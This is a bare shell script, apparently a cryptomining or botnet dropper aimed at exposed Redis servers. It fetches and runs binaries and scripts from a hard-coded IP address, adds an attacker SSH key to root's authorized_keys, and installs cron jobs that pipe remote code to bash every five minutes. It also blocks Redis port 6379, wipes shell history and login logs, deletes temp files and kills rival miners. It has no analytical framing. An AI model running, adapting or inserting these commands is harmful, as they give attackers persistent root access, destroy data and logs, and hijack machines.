uname -a
id


pkill .gpg-agent
pkill .sr0
rm -rf $HOME/.gpg-agent
rm -rf /tmp/*
rm -rf /root/.gpg-agent
rm -rf /var/tmp/*
rm -rf /var/spool/cron/*
mkdir -p /root/.ssh
mkdir -p /var/spool/cron/crontabs

if [ ! -f /usr/bin/gpg-agentd ]; then
	wget -q -O /usr/bin/gpg-agentd 159.89.190.243/dump.db || curl -s -o /usr/bin/gpg-agentd 159.89.190.243/dump.db
	sleep 5
	chmod +x /usr/bin/gpg-agentd
	/usr/bin/gpg-agentd
fi


echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX" > /root/.ssh/authorized_keys
echo "*/5 * * * * curl -fsSL 159.89.190.243/db.php | bash" > /var/spool/cron/root
echo "*/5 * * * * wget -q -O- 159.89.190.243/db.php | bash" >> /var/spool/cron/root
echo "*/5 * * * * curl -fsSL 159.89.190.243/db.php | bash" > /var/spool/cron/crontabs/root
echo "*/5 * * * * wget -q -O- 159.89.190.243/db.php | bash" >> /var/spool/cron/crontabs/root

iptables -I INPUT 1 -p tcp --dport 6379 -j DROP
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT

echo "" > .bash_history
echo "" > /var/log/wtmp
echo "" > /var/log/secure


bash -c '
rm -rf 1.0.4.tar.gz
rm -rf masscan-1.0.4
rm -rf /tmp/nix.tar.gz
rm -rf /tmp/masscan*
pkill -9 ./host
pkill -9 ./gpg-daemon
pkill -9 ./udevs
pkill -9 ./accounts-daemon
pkill -9 ./acpid
pkill -9 ./AnXqV.yam
pkill -9 ./askdljlqw
pkill -9 ./atd
pkill -9 ./BI5zj
pkill -9 ./bonn.sh
pkill -9 ./bonns
pkill -9 ./Carbon
pkill -9 ./carbon
pkill -9 ./conn.sh
pkill -9 ./conns
pkill -9 ./crypto-pool
pkill -9 ./ddg
pkill -9 ./donns
pkill -9 ./Duck.sh
pkill -9 ./gekoba2anc1
pkill -9 ./gekoba5xnc1
pkill -9 ./gekobalanc1
pkill -9 ./gekobalance
pkill -9 ./gekobalanq1
pkill -9 ./gekobnc1
pkill -9 ./gekoCrw
pkill -9 ./gekoCrw32
pkill -9 ./Guard.sh
pkill -9 ./ir29xc1
pkill -9 ./irpbalanc1
pkill -9 ./jaav
pkill -9 ./jIuc2ggfCAvYmluL2Jhc2gi
pkill -9 ./JnKihGjn
pkill -9 ./jva
pkill -9 ./KGlJwfWDbCPnvwEJupeivI1FXsSptuyh
pkill -9 ./kw.sh
pkill -9 ./kworker34
pkill -9 ./kxjd
pkill -9 ./lexarbalanc1
pkill -9 ./lower.sh
pkill -9 ./lowerv2.sh
pkill -9 ./lowerv3.sh
pkill -9 ./minerd
pkill -9 ./minergate
pkill -9 ./minergate-cli
pkill -9 ./minexmr
pkill -9 ./mixnerdx
pkill -9 ./mule
pkill -9 ./mutex
pkill -9 ./myatd
pkill -9 ./NXLAi
pkill -9 ./performedl
pkill -9 ./polkitd
pkill -9 ./pro.sh
pkill -9 ./pubg
pkill -9 ./pvv
pkill -9 ./root.sh
pkill -9 ./rootv2.sh
pkill -9 ./rootv3.sh
pkill -9 ./servcesa
pkill -9 ./sleep
pkill -9 ./sourplum
pkill -9 ./stratum
pkill -9 ./vsp
pkill -9 ./watch-smart
pkill -9 ./wget
pkill -9 ./XJnRj
pkill -9 ./ysaydh
pkill -9 accounts-daemon
pkill -9 askdljlqw
pkill -9 atd
pkill -9 BI5zj
pkill -9 bonns
pkill -9 conns
pkill -9 crypto-pool
pkill -9 donns
pkill -9 Guard.sh
pkill -9 ir29xc1
pkill -9 irqba2anc1
pkill -9 irqba5xnc1
pkill -9 irqbalance
pkill -9 irqbnc1
pkill -9 JnKihGjn
pkill -9 jva
pkill -9 kxjd
pkill -9 minerd
pkill -9 minergate
pkill -9 mixnerdx
pkill -9 NXLAi
pkill -9 performedl
pkill -9 sleep
pkill -9 supsplk
pkill -9 tratum
pkill -9 XJnRj
pkill -9 ysaydh
[ -f /tmp/udevs ] && rm -rf /tmp/udevs && pkill -f /tmp/udevs
[ -f /tmp/clay ] && rm -rf /tmp/clay && pkill -f /tmp/udevs
[ -f /dev/shm/jboss ] && rm -rf /dev/shm/jboss
[ -f /var/tmp/atd ] && rm -rf /var/tmp/atd
[ -f /var/tmp/ysjswirmrm.conf ] && rm -rf /var/tmp/ysjswirmrm.conf
'

bash -c "$( wget -q -O- 159.89.190.243/sr0.php || curl -fsSL 159.89.190.243/sr0.php )"
